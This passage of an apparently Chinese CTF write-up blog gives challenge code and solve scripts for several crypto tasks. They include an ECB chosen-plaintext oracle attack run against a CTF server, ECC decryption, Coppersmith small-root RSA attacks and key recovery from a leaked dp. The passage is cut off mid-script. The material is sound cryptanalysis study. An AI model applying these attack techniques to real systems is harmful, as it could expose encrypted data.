language_">self</span>.send(<span class="hljs-string">b&#x27;You can send your plaintext and get ciphertext&#x27;</span>)<br>            <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;[+] ciphertext = plaintext + FLAG&#x27;</span>)<br>            <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;Start?(yes/no)&#x27;</span>)<br>            <span class="hljs-keyword">while</span> go:<br>                c = <span class="hljs-variable language_">self</span>.recv()<br>                <span class="hljs-keyword">if</span> c == <span class="hljs-string">b&#x27;yes&#x27;</span>:<br>                    plain = <span class="hljs-variable language_">self</span>.recv()<br>                    cipher = encrypt(KEY,plain+FLAG)<br>                    <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;Your cipher:&#x27;</span>+ cipher.<span class="hljs-built_in">hex</span>().encode())<br>                <span class="hljs-keyword">else</span>:<br>                    go = <span class="hljs-number">0</span><br>                    <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;GoodBye!&#x27;</span>)<br><br>        <span class="hljs-keyword">except</span> TimeoutError:<br>            <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;[!] Ohhehe, Timeout!&#x27;</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadedServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ForkedServer</span>(socketserver.ForkingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    HOST,PORT = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,<span class="hljs-number">12321</span><br>    server = ForkedServer((HOST,PORT),Serve)<br>    server.allow_reuse_address = <span class="hljs-literal">True</span><br>    <span class="hljs-built_in">print</span>(HOST, PORT)<br>    server.serve_forever()<br></code></pre></td></tr></table></figure><p><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>():<br>    <span class="hljs-comment">#å»ºç«‹è¿æ¥</span><br>    host = <span class="hljs-string">&#x27;nc1.ctfplus.cn&#x27;</span><br>    port = <span class="hljs-number">14816</span><br>    conn = remote(host, port)<br>    <span class="hljs-comment">#çˆ†ç ´è¡¨</span><br>    table = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_&#123;&#125;&#x27;</span><br><br>    <span class="hljs-comment">#è¿›å…¥äº¤äº’</span><br>    <span class="hljs-comment">#è®°å½•åˆå§‹å¯†æ–‡é•¿åº¦</span><br>    conn.recvuntil(<span class="hljs-string">b&#x27;Start?(yes/no)&#x27;</span>)<br>    conn.sendline(<span class="hljs-string">b&#x27;yes&#x27;</span>)<br><br>    <br>    send_data = <span class="hljs-string">b&#x27;&#x27;</span><br>    conn.sendline(send_data)<br>    conn.recvuntil(<span class="hljs-string">b&#x27;Your cipher:&#x27;</span>)<br>    ct = conn.recvline()[:-<span class="hljs-number">1</span>]   <span class="hljs-comment">#å»æ‰æ¢è¡Œç¬¦</span><br>    <span class="hljs-built_in">print</span>(ct)<br><br>    <br>    lenth = <span class="hljs-built_in">len</span>(ct)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        conn.sendline(<span class="hljs-string">b&#x27;yes&#x27;</span>)<br>        send_data =  send_data + <span class="hljs-string">b&#x27;0&#x27;</span><br>        conn.sendline(send_data)<br><br>        conn.recvuntil(<span class="hljs-string">b&#x27;Your cipher:&#x27;</span>)<br>        ct = conn.recvline()[:-<span class="hljs-number">1</span>]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ct=&quot;</span>, ct)<br><br>        lenth2 = <span class="hljs-built_in">len</span>(ct)<br>        <span class="hljs-keyword">if</span> lenth2 &gt; lenth:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;lenth2=&quot;</span>, lenth2)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;lenth=&quot;</span>, lenth)<br>            <span class="hljs-keyword">break</span><br>    lenth = lenth//<span class="hljs-number">2</span>-<span class="hljs-built_in">len</span>(send_data)+<span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;lenth=&quot;</span>, lenth)<br><br>    <span class="hljs-comment">#çˆ†ç ´flag</span><br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(lenth):<br>        send_data = <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">31</span> - i)<br>        conn.sendline(<span class="hljs-string">b&#x27;yes&#x27;</span>)<br>        conn.sendline(send_data)<br><br>        conn.recvuntil(<span class="hljs-string">b&#x27;Your cipher:&#x27;</span>)<br>        ct = conn.recvline()[:-<span class="hljs-number">1</span>]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ct=&quot;</span>, ct)<br><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> table:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;j=&quot;</span>, j.encode())<br>            send_data = <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">31</span> - i) + flag.encode() + j.encode()<br>            conn.sendline(<span class="hljs-string">b&#x27;yes&#x27;</span>)<br>            conn.sendline(send_data)<br>            conn.recvuntil(<span class="hljs-string">b&#x27;Your cipher:&#x27;</span>)<br>            ct2 = conn.recvline()[:-<span class="hljs-number">1</span>]<br><br>            <span class="hljs-keyword">if</span> ct2[:<span class="hljs-number">64</span>] == ct[:<span class="hljs-number">64</span>]:<br>                <span class="hljs-comment">#print(&quot;ct2=&quot;, ct2)</span><br>                <span class="hljs-comment">#print(&quot;ct=&quot;, ct)</span><br>                flag = flag + j<br><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag=&quot;</span>, flag)<br>                <span class="hljs-keyword">break</span><br><br>    <br>    <span class="hljs-keyword">return</span> flag<br><br>flag = attack()<br></code></pre></td></tr></table></figure><h1 id="ECC"><a href="#ECC" class="headerlink" title="ECC"></a>ECC</h1><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br>p = getPrime(<span class="hljs-number">256</span>)<br>a = getPrime(<span class="hljs-number">256</span>)<br>b = getPrime(<span class="hljs-number">256</span>)<br>E = EllipticCurve(GF(p),[a,b])<br>m = E.random_point()<br>G = E.random_point()<br>k = getPrime(<span class="hljs-number">256</span>)<br>K = k * G<br>r = getPrime(<span class="hljs-number">256</span>)<br>c1 = m + r * K<br>c2 = r * G<br><br>cipher_left = bytes_to_long(flag[:<span class="hljs-built_in">len</span>(flag)//<span class="hljs-number">2</span>]) * m[<span class="hljs-number">0</span>]<br>cipher_right = bytes_to_long(flag[<span class="hljs-built_in">len</span>(flag)//<span class="hljs-number">2</span>:]) * m[<span class="hljs-number">1</span>]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;p = <span class="hljs-subst">&#123;p&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;a = <span class="hljs-subst">&#123;a&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;b = <span class="hljs-subst">&#123;b&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;k = <span class="hljs-subst">&#123;k&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;E = <span class="hljs-subst">&#123;E&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c1 = <span class="hljs-subst">&#123;c1&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c2 = <span class="hljs-subst">&#123;c2&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;cipher_left = <span class="hljs-subst">&#123;cipher_left&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;cipher_right = <span class="hljs-subst">&#123;cipher_right&#125;</span>&quot;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">p = 93202687891394085633786409619308940289806301885603002539703165565954917915237</span><br><span class="hljs-string">a = 93822086754590882682502837744000915992590989006575416134628106376590825652793</span><br><span class="hljs-string">b = 80546187587527518012258369984400999843218609481640396827119274116524742672463</span><br><span class="hljs-string">k = 58946963503925758614502522844777257459612909354227999110879446485128547020161</span><br><span class="hljs-string">E = Elliptic Curve defined by y^2 = x^3 + 619398863196797048716428124691975702784687120972413594924940810635907737556*x + 80546187587527518012258369984400999843218609481640396827119274116524742672463 over Finite Field of size 93202687891394085633786409619308940289806301885603002539703165565954917915237</span><br><span class="hljs-string">c1 = (40485287784577105052142632380297282223290388901294496494726004092953216846111 : 81688798450940847410572480357702533480504451191937977779652402489509511335169 : 1)</span><br><span class="hljs-string">c2 = (51588540344302003527882762117190244240363885481651104291377049503085003152858 : 77333747801859674540077067783932976850711668089918703995609977466893496793359 : 1)</span><br><span class="hljs-string">cipher_left = 34210996654599605871773958201517275601830496965429751344560373676881990711573</span><br><span class="hljs-string">cipher_right = 62166121351090454316858010748966403510891793374784456622783974987056684617905</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>p = <span class="hljs-number">93202687891394085633786409619308940289806301885603002539703165565954917915237</span><br>a = <span class="hljs-number">93822086754590882682502837744000915992590989006575416134628106376590825652793</span><br>b = <span class="hljs-number">80546187587527518012258369984400999843218609481640396827119274116524742672463</span><br>k = <span class="hljs-number">58946963503925758614502522844777257459612909354227999110879446485128547020161</span><br><br>E = EllipticCurve(GF(p), [a, b])<br><br>c1 = E(<br>    <span class="hljs-number">40485287784577105052142632380297282223290388901294496494726004092953216846111</span>,<br>    <span class="hljs-number">81688798450940847410572480357702533480504451191937977779652402489509511335169</span><br>)<br>c2 = E(<br>    <span class="hljs-number">51588540344302003527882762117190244240363885481651104291377049503085003152858</span>,<br>    <span class="hljs-number">77333747801859674540077067783932976850711668089918703995609977466893496793359</span><br>)<br>cipher_left = <span class="hljs-number">34210996654599605871773958201517275601830496965429751344560373676881990711573</span><br>cipher_right = <span class="hljs-number">62166121351090454316858010748966403510891793374784456622783974987056684617905</span><br><br>m = c1 - k * c2<br>m_x = <span class="hljs-built_in">int</span>(m[<span class="hljs-number">0</span>])<br>m_y = <span class="hljs-built_in">int</span>(m[<span class="hljs-number">1</span>])<br>m0 = inverse(m_x, p)<br>m1 = inverse(m_y, p)<br>ans0 = long_to_bytes((cipher_left * m0) % p)<br>ans1 = long_to_bytes((cipher_right * m1) % p)<br><span class="hljs-built_in">print</span>(ans0 + ans1)<br></code></pre></td></tr></table></figure><h1 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h1><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br>m = bytes_to_long(flag)<br><span class="hljs-keyword">assert</span> m.bit_length()&lt;<span class="hljs-number">500</span><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>n = p*q<br>e = <span class="hljs-number">3</span><br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br>bits = <span class="hljs-number">150</span><br>m = (m &gt;&gt; bits) &lt;&lt; bits<br>h = (<span class="hljs-number">2024</span>*m-<span class="hljs-number">2023</span>) % n<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n =&#x27;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c =&#x27;</span>,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;h =&#x27;</span>,h)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 98776098002891477120992675696155328927086322526307976337988006606436135336004472363084175941067711391936982491358233723506086793155908108571814951698009309071244571404116817767749308434991695075517682979438837852005396491907180020541510210086588426719828012276157990720969176680296088209573781988504138607511</span><br><span class="hljs-string">c = 9379399412697943604731810117788765980709097637865795846842608472521416662350816995261599566999896411508374352899659705171307916591351157861393506101348972544843696221631571188094524310759046142743046919075577350821523746192424192386688583922197969461446371843309934880019670502610876840610213491163201385965</span><br><span class="hljs-string">h = 111518648179416351438603824560360041496706848494616308866057817087295675324528913254309319829895222661760009533326673551072163865</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> inverse, long_to_bytes<br><br>n = <span class="hljs-number">98776098002891477120992675696155328927086322526307976337988006606436135336004472363084175941067711391936982491358233723506086793155908108571814951698009309071244571404116817767749308434991695075517682979438837852005396491907180020541510210086588426719828012276157990720969176680296088209573781988504138607511</span><br>c = <span class="hljs-number">9379399412697943604731810117788765980709097637865795846842608472521416662350816995261599566999896411508374352899659705171307916591351157861393506101348972544843696221631571188094524310759046142743046919075577350821523746192424192386688583922197969461446371843309934880019670502610876840610213491163201385965</span><br>h = <span class="hljs-number">111518648179416351438603824560360041496706848494616308866057817087295675324528913254309319829895222661760009533326673551072163865</span><br>e = <span class="hljs-number">3</span><br>bits = <span class="hljs-number">150</span><br><br>m = (h + <span class="hljs-number">2023</span>)*inverse(<span class="hljs-number">2024</span>, n) % n<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;m = <span class="hljs-subst">&#123;m&#125;</span>&quot;</span>)<br><br>P.&lt;x&gt; = PolynomialRing(Zmod(n))<br>f = (m+x)^e - c<br>roots = f.small_roots()[<span class="hljs-number">0</span>]<br><span class="hljs-keyword">if</span> roots:<br>    ans = long_to_bytes(<span class="hljs-built_in">int</span>(m+roots))<br>    <span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h1 id="highlow"><a href="#highlow" class="headerlink" title="highlow"></a>highlow</h1><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>e = <span class="hljs-number">65537</span><br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br>n = p * q<br>pxor = p ^ (bytes_to_long(flag)&lt;&lt;<span class="hljs-number">400</span>)<br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(flag)== <span class="hljs-number">44</span><br>m = bytes_to_long(flag)<br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c =&#x27;</span>,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n =&#x27;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;pxor =&#x27;</span>,pxor)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">c = 11017336122691034053241992293963114590816319844384287448629663672049205892828600396465505710922907685545939978376321927394655458727494361852952898280905220963163625482295222856129164172619564344634365520328815972232825639292605311741655988427166811406091329613627961070231457035303298793651546412496975662225857123805867756651901374507447803198638466304862480202099076813471571495380132563252630789218173007275890600746758285415274434393381125742526014986039652677605642226576741424053749512280825231217420239089105794080707322357602941046822659335487420672699022969372037662958497832065752272061853723653365171768556</span><br><span class="hljs-string">n = 14091206320622523674847720139761543154822190879035380245424481267482550932229611965964424965958386255076593911062804299275581742665134207390532802109700225140999812698020838683697375891035625255222001884477214361835101442288725383073334392995186053867261497679234362794914108033574681292656522807928680812726462195077833184018122369579002715900477290345396065912536529290811962117814900448319776590712946259540382461632468634827959957286905806432005632864663985014872365672653476822833921870071851313424903481282350342304819149894610089804321405589433980650340610521659031234826823369114800150883988613877877881069579</span><br><span class="hljs-string">pxor = 124229245244085791439650934438639686782423445183921252684721764061493908790073948877623812930339081158169421854801552819088679937157357924845248082716160727839419054107753000815066526032809275137495740454967765165248115412626716101315676902716808647904092798908601183908297141420793614426863816161203796966951</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>pxor = <span class="hljs-number">124229245244085791439650934438639686782423445183921252684721764061493908790073948877623812930339081158169421854801552819088679937157357924845248082716160727839419054107753000815066526032809275137495740454967765165248115412626716101315676902716808647904092798908601183908297141420793614426863816161203796966951</span><br>c = <span class="hljs-number">11017336122691034053241992293963114590816319844384287448629663672049205892828600396465505710922907685545939978376321927394655458727494361852952898280905220963163625482295222856129164172619564344634365520328815972232825639292605311741655988427166811406091329613627961070231457035303298793651546412496975662225857123805867756651901374507447803198638466304862480202099076813471571495380132563252630789218173007275890600746758285415274434393381125742526014986039652677605642226576741424053749512280825231217420239089105794080707322357602941046822659335487420672699022969372037662958497832065752272061853723653365171768556</span><br>n = <span class="hljs-number">14091206320622523674847720139761543154822190879035380245424481267482550932229611965964424965958386255076593911062804299275581742665134207390532802109700225140999812698020838683697375891035625255222001884477214361835101442288725383073334392995186053867261497679234362794914108033574681292656522807928680812726462195077833184018122369579002715900477290345396065912536529290811962117814900448319776590712946259540382461632468634827959957286905806432005632864663985014872365672653476822833921870071851313424903481282350342304819149894610089804321405589433980650340610521659031234826823369114800150883988613877877881069579</span><br>e = <span class="hljs-number">65537</span><br><br>p_low = pxor &amp; (<span class="hljs-number">2</span>^<span class="hljs-number">400</span> - <span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(p_low)<br>fbits = <span class="hljs-number">44</span>*<span class="hljs-number">8</span><br>kbits = <span class="hljs-number">400</span> + fbits<br><span class="hljs-built_in">print</span>(kbits)<br><br>p_high = (pxor &gt;&gt; kbits) &lt;&lt; kbits<br><span class="hljs-built_in">print</span>(p_high)<br><br>P.&lt;x&gt; = PolynomialRing(Zmod(n))<br>f = p_high + x * <span class="hljs-number">2</span>^<span class="hljs-number">400</span> + p_low<br>f = f.monic()<br>root = f.small_roots(X=<span class="hljs-number">2</span>^fbits,beta=<span class="hljs-number">0.44</span>)[<span class="hljs-number">0</span>]<br>p = p_high + <span class="hljs-built_in">int</span>(root)*<span class="hljs-number">2</span>^<span class="hljs-number">400</span> + p_low <br>q = n//p<br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = inverse(e,phi)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br>ans = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h1 id="inPEM"><a href="#inPEM" class="headerlink" title="inPEM"></a>inPEM</h1><p><strong>åˆ†æï¼š</strong><br>å¯ä»¥é€šè¿‡ä¸å®Œæ•´çš„ç§é’¥æ–‡ä»¶å¾—åˆ°dpï¼Œdqï¼Œå…·ä½“åŸç†å¯å‚è€ƒæˆ‘çš„å¦ä¸€ç¯‡æ–‡ç« <a href="https://ramoor.github.io/2025/07/03/Crypto%E5%9F%BA%E7%A1%80%E7%AF%87-PEM%E6%96%87%E4%BB%B6/">CryptoåŸºç¡€ç¯‡-PEMæ–‡ä»¶ - Ramoor</a></p><p><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> inverse, long_to_bytes,bytes_to_long<br><br>dp = <span class="hljs-string">&quot;00 ba 5b ea f3 82 f5 86 bf 04 46 15 f3 ec 8b f3 5e 0a d0 a4 1c ec b2 13 93 0a 86 ac 35 a8 0d 90 31 9a 05 aa 56 da 31 1e e8 43 5a be 63 17 eb 6d 15 90 4f c7 87 d3 7b 34 c4 8d aa d7 5d 2b 77 a4 1d 5c ec 4c 27 cc ed 07 cb da 89 1f ef a0 d9 d7 02 50 23 bc b8 65 c1 6c 00 02 66 a0 90 64 00 32 75 2a cc e7 3a 33 58 06 0c 05 67 23 e7 88 f4 2e dc 8e 12 0e 0f 58 f5 e2 4f 32 7f ff 1c 56 68 7f b1&quot;</span><br>dq = <span class="hljs-string">&quot;a1 46 44 8c 98 0f cf 49 be 56 40 ea 8c fb 62 78 f3 b2 70 e5 4e ad 35 b5 dd f6 5c 0b b0 eb 67 59 40 75 a6 83 59 e9 0b 76 2d cc 59 60 4f 23 58 d9 07 a5 39 b9 ab cb 27 36 bc 59 f1 56 14 d8 70 35 c5 2d 0c 2b 5f c5 f9 61 5e 00 ac 50 00 97 2c f1 a4 dc d8 3f 30 c7 ad da 8b 0f a3 e1 31 4f b0 46 e1 d5 3f 20 2d 34 1b 0b d0 df a6 81 07 2c 58 92 6f 9e 04 93 1e 0f 3a 90 93 a5 1e 53 6e 2c 11 a1&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">strings_trans</span>(<span class="hljs-params">strings</span>):<br>    strings=strings.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">return</span> strings<br><br>dp = <span class="hljs-built_in">int</span>(strings_trans(dp),<span class="hljs-number">16</span>)<br>dq = <span class="hljs-built_in">int</span>(strings_trans(dq),<span class="hljs-number">16</span>)<br>n = <span class="hljs-number">19909823107653171578063591352961144331355821517081529017694276790993397379180193511755806958091550033235815834847549265751244192211761569881061742997804509098095297146520946343734939782935970054031389390447526577982809412074573616889663964050032806967234869741452169276495048891650957729859124875343810181695665153129824527065062831773013713479602052423965588148263292672514853749647510938621421264137177666497737099263481269491867593812579958283619882699866915561357437484323854411934718569074869408000191465973545262527827064708529700071967884924505367105288433603597633451764659888020272057850625902629529400734213</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">127916287434936224964530288403657504450134210781148845328357237956681373722556447001247137686758965891751380034827824922625307521221598031789165449134994998397717982461775225812413476283147124013667777578827293691666320739053915493782515447112364470583788127477537555786778672970196314874316507098162498135060</span><br><br><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;key.enc&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>)<br>c = bytes_to_long(file.read())<br><br>x = e*dp - <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,e):<br>    <span class="hljs-keyword">if</span> x % i == <span class="hljs-number">0</span>:<br>        p_1 = x // i + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> n % p_1 == <span class="hljs-number">0</span>:<br>            p = p_1<br>            q = n // p<br>            <span class="hljs-keyword">break</span><br>phi = 